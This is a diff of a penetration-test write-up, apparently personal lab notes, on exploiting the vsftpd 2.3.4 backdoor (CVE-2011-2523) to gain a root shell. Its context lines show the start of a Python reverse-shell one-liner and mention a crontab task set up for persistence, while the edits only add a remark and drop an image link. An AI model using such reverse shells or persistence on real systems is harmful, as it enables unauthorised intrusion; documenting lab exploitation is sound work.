@@ -230,7 +230,7 @@ Patch Verification: Validate that the updated version does not contain the backd
 
 No additional privilege escalation was required, as the exploited vulnerability (CVE-2011-2523) in vsftpd 2.3.4 resulted in immediate remote access with root-level privileges.
 
-
+We can see that the root user has ALL-ALL permits
 ![[Pasted image 20250512150323.png]]
 
 After receiving a shell from the previously executed exploit, we upgraded to a bash shell
@@ -244,7 +244,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 
 creamos una terea crontab para tener persistencia
-![[Pasted image 20250512163457.png]]
+
 
 credenciales
 ![[Pasted image 20250512164302.png]]
